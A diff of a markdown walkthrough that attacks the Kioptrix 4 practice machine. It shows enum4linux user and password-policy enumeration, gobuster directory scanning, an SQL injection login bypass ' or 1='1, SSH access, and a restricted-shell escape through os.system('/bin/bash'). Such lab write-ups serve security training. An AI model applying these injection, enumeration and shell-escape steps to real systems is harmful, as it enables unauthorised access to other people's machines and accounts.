@@ -205,168 +205,104 @@ HOP RTT ADDRESS
 
 ### Enum4linux
 
-Enumerating Samba components with enum4linux:
-
+Enumerating Samba components with enum4linux (grep was used to get cleaner output)
 ```bash
-root@kali:~# enum4linux 192.168.211.129 \| grep -v unknown
+root@kali:~# enum4linux 192.168.211.129 | grep -v unknown
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Sep  3 23:49:08 2019
 
-Starting enum4linux v0.8.9 (http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Sep 3 23:49:08 2019
-
-==========================
-
-| Target Information |
-
-==========================
-
+ ========================== 
+|    Target Information    |
+ ========================== 
 Target ........... 192.168.211.129
-
 RID Range ........ 500-550,1000-1050
-
 Username ......... ''
-
 Password ......... ''
-
 Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 
-=======================================================
 
-| Enumerating Workgroup/Domain on 192.168.211.129 |
-
-=======================================================
-
+ ======================================================= 
+|    Enumerating Workgroup/Domain on 192.168.211.129    |
+ ======================================================= 
 [+] Got domain/workgroup name: WORKGROUP
 
-===============================================
-
-| Nbtstat Information for 192.168.211.129 |
-
-===============================================
-
+ =============================================== 
+|    Nbtstat Information for 192.168.211.129    |
+ =============================================== 
 Looking up status of 192.168.211.129
+	KIOPTRIX4       <00> -         B <ACTIVE>  Workstation Service
+	KIOPTRIX4       <03> -         B <ACTIVE>  Messenger Service
+	KIOPTRIX4       <20> -         B <ACTIVE>  File Server Service
+	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
+	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
 
-KIOPTRIX4 <00> - B <ACTIVE> Workstation Service
+	MAC Address = 00-00-00-00-00-00
 
-KIOPTRIX4 <03> - B <ACTIVE> Messenger Service
-
-KIOPTRIX4 \<20\> - B \<ACTIVE\> File Server Service
-
-..__MSBROWSE__. <01> - <GROUP> B <ACTIVE> Master Browser
-
-WORKGROUP <1d\> - B <ACTIVE> Master Browser
-
-WORKGROUP <1e\> - <GROUP> B <ACTIVE> Browser Service Elections
-
-WORKGROUP <00> - <GROUP> B <ACTIVE> Domain/Workgroup Name
-
-MAC Address = 00-00-00-00-00-00
-
-========================================
-
-| Session Check on 192.168.211.129 |
-
-========================================
-
+ ======================================== 
+|    Session Check on 192.168.211.129    |
+ ======================================== 
 [+] Server 192.168.211.129 allows sessions using username '', password ''
 
-==============================================
-
-| Getting domain SID for 192.168.211.129 |
-
-==============================================
-
+ ============================================== 
+|    Getting domain SID for 192.168.211.129    |
+ ============================================== 
 Domain Name: WORKGROUP
-
 Domain Sid: (NULL SID)
-
 [+] Can't determine if host is part of domain or part of a workgroup
 
-=========================================
-
-| OS information on 192.168.211.129 |
-
-=========================================
-
-Use of uninitialized value \$os_info in concatenation (.) or string at
-./enum4linux.pl line 464.
-
-[+] Got OS info for 192.168.211.129 from smbclient:
-
+ ========================================= 
+|    OS information on 192.168.211.129    |
+ ========================================= 
+Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
+[+] Got OS info for 192.168.211.129 from smbclient: 
 [+] Got OS info for 192.168.211.129 from srvinfo:
+	KIOPTRIX4      Wk Sv PrQ Unx NT SNT Kioptrix4 server (Samba, Ubuntu)
+	platform_id     :	500
+	os version      :	4.9
+	server type     :	0x809a03
 
-KIOPTRIX4 Wk Sv PrQ Unx NT SNT Kioptrix4 server (Samba, Ubuntu)
-
-platform_id : 500
-
-os version : 4.9
-
-server type : 0x809a03
-
-================================
-
-| Users on 192.168.211.129 |
-
-================================
-
-index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody Name: nobody Desc: (null)
-
-index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert Name: ,,, Desc: (null)
-
-index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root Name: root Desc: (null)
-
-index: 0x4 RID: 0xbba acb: 0x00000010 Account: john Name: ,,, Desc: (null)
-
-index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret Name: loneferret,,,
-Desc: (null)
+ ================================ 
+|    Users on 192.168.211.129    |
+ ================================ 
+index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody	Name: nobody	Desc: (null)
+index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert	Name: ,,,	Desc: (null)
+index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root	Name: root	Desc: (null)
+index: 0x4 RID: 0xbba acb: 0x00000010 Account: john	Name: ,,,	Desc: (null)
+index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret	Name: loneferret,,,	Desc: (null)
 
 user:[nobody] rid:[0x1f5]
-
 user:[robert] rid:[0xbbc]
-
 user:[root] rid:[0x3e8]
-
 user:[john] rid:[0xbba]
-
 user:[loneferret] rid:[0xbb8]
 
-============================================
+ ============================================ 
+|    Share Enumeration on 192.168.211.129    |
+ ============================================ 
 
-| Share Enumeration on 192.168.211.129 |
-
-============================================
-
-Sharename Type Comment
-
---------- ---- -------
-
-print\$ Disk Printer Drivers
-
-IPC\$ IPC IPC Service (Kioptrix4 server (Samba, Ubuntu))
-
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	IPC$            IPC       IPC Service (Kioptrix4 server (Samba, Ubuntu))
 Reconnecting with SMB1 for workgroup listing.
 
-Server Comment
+	Server               Comment
+	---------            -------
 
---------- -------
-
-Workgroup Master
-
---------- -------
-
-WORKGROUP KIOPTRIX4
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            KIOPTRIX4
 
 [+] Attempting to map shares on 192.168.211.129
+//192.168.211.129/print$	Mapping: DENIED, Listing: N/A
+//192.168.211.129/IPC$	[E] Can't understand response:
+NT_STATUS_NETWORK_ACCESS_DENIED listing \*
 
-//192.168.211.129/print$ Mapping: DENIED, Listing: N/A
+ ======================================================= 
+|    Password Policy Information for 192.168.211.129    |
+ ======================================================= 
 
-//192.168.211.129/IPC$ [E] Can't understand response:
-
-NT_STATUS_NETWORK_ACCESS_DENIED listing \\\*
-
-=======================================================
-
-| Password Policy Information for 192.168.211.129 |
-
-=======================================================
 
 [+] Attaching to 192.168.211.129 using a NULL share
 
@@ -374,53 +310,39 @@ NT_STATUS_NETWORK_ACCESS_DENIED listing \\\*
 
 [+] Found domain(s):
 
-[+] KIOPTRIX4
-
-[+] Builtin
+	[+] KIOPTRIX4
+	[+] Builtin
 
 [+] Password Info for Domain: KIOPTRIX4
 
-[+] Minimum password length: 5
+	[+] Minimum password length: 5
+	[+] Password history length: None
+	[+] Maximum password age: Not Set
+	[+] Password Complexity Flags: 000000
 
-[+] Password history length: None
+		[+] Domain Refuse Password Change: 0
+		[+] Domain Password Store Cleartext: 0
+		[+] Domain Password Lockout Admins: 0
+		[+] Domain Password No Clear Change: 0
+		[+] Domain Password No Anon Change: 0
+		[+] Domain Password Complex: 0
 
-[+] Maximum password age: Not Set
+	[+] Minimum password age: None
+	[+] Reset Account Lockout Counter: 30 minutes 
+	[+] Locked Account Duration: 30 minutes 
+	[+] Account Lockout Threshold: None
+	[+] Forced Log off Time: Not Set
 
-[+] Password Complexity Flags: 000000
-
-[+] Domain Refuse Password Change: 0
-
-[+] Domain Password Store Cleartext: 0
-
-[+] Domain Password Lockout Admins: 0
-
-[+] Domain Password No Clear Change: 0
-
-[+] Domain Password No Anon Change: 0
-
-[+] Domain Password Complex: 0
-
-[+] Minimum password age: None
-
-[+] Reset Account Lockout Counter: 30 minutes
-
-[+] Locked Account Duration: 30 minutes
-
-[+] Account Lockout Threshold: None
-
-[+] Forced Log off Time: Not Set
 
 [+] Retieved partial password policy with rpcclient:
 
 Password Complexity: Disabled
-
 Minimum Password Length: 0
 
-=================================
 
-| Groups on 192.168.211.129 |
-
-=================================
+ ================================= 
+|    Groups on 192.168.211.129    |
+ ================================= 
 
 [+] Getting builtin groups:
 
@@ -434,61 +356,39 @@ Minimum Password Length: 0
 
 [+] Getting domain group memberships:
 
-==========================================================================
-
-| Users on 192.168.211.129 via RID cycling (RIDS: 500-550,1000-1050) |
-
-==========================================================================
-
+ ========================================================================== 
+|    Users on 192.168.211.129 via RID cycling (RIDS: 500-550,1000-1050)    |
+ ========================================================================== 
 [I] Found new SID: S-1-5-21-2529228035-991147148-3991031631
-
 [I] Found new SID: S-1-22-1
-
 [I] Found new SID: S-1-5-32
-
 [+] Enumerating users using SID S-1-22-1 and logon username '', password ''
-
-S-1-22-1-1000 Unix User\\loneferret (Local User)
-
-S-1-22-1-1001 Unix User\\john (Local User)
-
-S-1-22-1-1002 Unix User\\robert (Local User)
-
+S-1-22-1-1000 Unix User\loneferret (Local User)
+S-1-22-1-1001 Unix User\john (Local User)
+S-1-22-1-1002 Unix User\robert (Local User)
 [+] Enumerating users using SID S-1-5-32 and logon username '', password ''
+S-1-5-32-544 BUILTIN\Administrators (Local Group)
+S-1-5-32-545 BUILTIN\Users (Local Group)
+S-1-5-32-546 BUILTIN\Guests (Local Group)
+S-1-5-32-547 BUILTIN\Power Users (Local Group)
+S-1-5-32-548 BUILTIN\Account Operators (Local Group)
+S-1-5-32-549 BUILTIN\Server Operators (Local Group)
+S-1-5-32-550 BUILTIN\Print Operators (Local Group)
+[+] Enumerating users using SID S-1-5-21-2529228035-991147148-3991031631 and logon username '', password ''
+S-1-5-21-2529228035-991147148-3991031631-501 KIOPTRIX4\nobody (Local User)
+S-1-5-21-2529228035-991147148-3991031631-513 KIOPTRIX4\None (Domain Group)
+S-1-5-21-2529228035-991147148-3991031631-1000 KIOPTRIX4\root (Local User)
 
-S-1-5-32-544 BUILTIN\\Administrators (Local Group)
-
-S-1-5-32-545 BUILTIN\\Users (Local Group)
-
-S-1-5-32-546 BUILTIN\\Guests (Local Group)
-
-S-1-5-32-547 BUILTIN\\Power Users (Local Group)
-
-S-1-5-32-548 BUILTIN\\Account Operators (Local Group)
-
-S-1-5-32-549 BUILTIN\\Server Operators (Local Group)
-
-S-1-5-32-550 BUILTIN\\Print Operators (Local Group)
-
-[+] Enumerating users using SID S-1-5-21-2529228035-991147148-3991031631 and
-logon username '', password ''
-
-S-1-5-21-2529228035-991147148-3991031631-501 KIOPTRIX4\\nobody (Local User)
-
-S-1-5-21-2529228035-991147148-3991031631-513 KIOPTRIX4\\None (Domain Group)
-
-S-1-5-21-2529228035-991147148-3991031631-1000 KIOPTRIX4\\root (Local User)
-
-================================================
-
-| Getting printer info for 192.168.211.129 |
-
-================================================
-
+ ================================================ 
+|    Getting printer info for 192.168.211.129    |
+ ================================================ 
 No printers returned.
 
-enum4linux complete on Tue Sep 3 23:49:35 2019
+enum4linux complete on Tue Sep  3 23:49:35 2019
 ```
+
+The scan above provided 3 usernames: john, robert and loneferret
+
 ### Web Port Enumeration
 
 #### Nikto
@@ -528,64 +428,42 @@ root@kali:~# nikto -h 192.168.211.129
 ```
 #### GoBuster
 
-root\@kali:\~\# gobuster dir -u 192.168.211.129 -w
-/usr/share/wordlists/dirb/common.txt
+Discovering hidden web directories with GoBuster:
 
+```bash
+root@kali:~# gobuster dir -u 192.168.211.129 -w /usr/share/wordlists/dirb/common.txt 
 ===============================================================
-
 Gobuster v3.0.1
-
-by OJ Reeves (\@TheColonial) & Christian Mehlmauer (\@_FireFart_)
-
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
-
-[+] Url: http://192.168.211.129
-
-[+] Threads: 10
-
-[+] Wordlist: /usr/share/wordlists/dirb/common.txt
-
-[+] Status codes: 200,204,301,302,307,401,403
-
-[+] User Agent: gobuster/3.0.1
-
-[+] Timeout: 10s
-
+[+] Url:            http://192.168.211.129
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
 ===============================================================
-
 2019/09/03 23:54:23 Starting gobuster
-
 ===============================================================
-
 /.htaccess (Status: 403)
-
 /.hta (Status: 403)
-
 /.htpasswd (Status: 403)
-
 /cgi-bin/ (Status: 403)
-
 /images (Status: 301)
-
 /index (Status: 200)
-
 /index.php (Status: 200)
-
 /john (Status: 301)
-
 /logout (Status: 302)
-
 /member (Status: 302)
-
 /server-status (Status: 403)
-
 ===============================================================
-
 2019/09/03 23:54:25 Finished
-
 ===============================================================
+```
 
 #### Browser
+
+Using the browser to enumerate webpage and discovering Member Login page.
 
 ![](media/dfe598696f03a9721fd72a5842090468.png)
 
@@ -593,6 +471,7 @@ Low Privilege Exploitation
 --------------------------
 
 ### SQL Injection
+Using usernames discovered with enum4linux, password field can be injected with the following code: ```' or 1='1```
 
 ![](media/03af4891d23445482169dfbfc9ba12ef.png)
 
@@ -600,18 +479,11 @@ Low Privilege Exploitation
 
 ### SSH
 
-ssh john\@192.168.211.129
+With credentials obtained from Member’s Control Panel, SSH can be used to get low privilege shell to the system.
+```bash
+ssh robert@192.168.211.129
 
-The authenticity of host '192.168.211.129 (192.168.211.129)' can't be
-established.
-
-RSA key fingerprint is SHA256:3fqlLtTAindnY7CGwxoXJ9M2rQF6nn35SFMTVv56lww.
-
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-
-Warning: Permanently added '192.168.211.129' (RSA) to the list of known hosts.
-
-john\@192.168.211.129's password:
+robert@192.168.211.129's password:
 
 Welcome to LigGoat Security Systems - We are Watching
 
@@ -624,16 +496,21 @@ Type '?' or 'help' to get the list of allowed commands
 robert:\~\$ ?
 
 cd clear echo exit help ll lpath ls
-
+```
 #### Escaping the Shell
 
+As the low privilige shell is very restrictive echo command can be used to obtain a non-restrictive shell.
+```bash
 robert:\~\$ echo os.system('/bin/bash')
-
+```
 Privilege Escalation Enumeration
 --------------------------------
 
-### Determining what processes are running on the system:
+### Determining what services are running on the system.
 
+Below service running with root priviliges are displayed.
+
+```bash
 robert\@Kioptrix4:/\$ ps aux \| grep root \| grep -v ]
 
 root 1 0.0 0.1 2844 1692 ? Ss 19:40 0:02 /sbin/init
@@ -657,11 +534,10 @@ root 4732 0.0 0.0 5316 992 ? Ss 19:41 0:00 /usr/sbin/sshd
 
 root 4788 0.0 0.0 1772 524 ? S 19:41 0:00 /bin/sh /usr/bin/mysqld_safe
 
-root 4830 0.0 1.7 127224 17608 ? Sl 19:41 0:04 /usr/sbin/mysqld --basedir=/usr
---datadir=/var/lib/mysql --user=root --pid-file=/var/ru
+**root 4830 0.0 1.7 127224 17608 ? Sl 19:41 0:04 /usr/sbin/mysqld --basedir=/usr
+--datadir=/var/lib/mysql --user=root --pid-file=/var/ru**
 
-root 4832 0.0 0.0 1700 552 ? S 19:41 0:00 logger -p daemon.err -t mysqld_safe -i
--t mysqld
+root 4832 0.0 0.0 1700 552 ? S 19:41 0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
 
 root 4905 0.0 0.1 6528 1332 ? Ss 19:41 0:00 /usr/sbin/nmbd -D
 
@@ -684,6 +560,10 @@ root 5050 0.0 0.0 8084 868 ? S 19:47 0:00 /usr/sbin/winbindd
 root 5051 0.0 0.1 8092 1264 ? S 19:47 0:00 /usr/sbin/winbindd
 
 robert 8762 0.0 0.0 3004 752 pts/2 R+ 22:21 0:00 grep root
+
+```
+
+
 
 ### Searching for MySQL password:
 
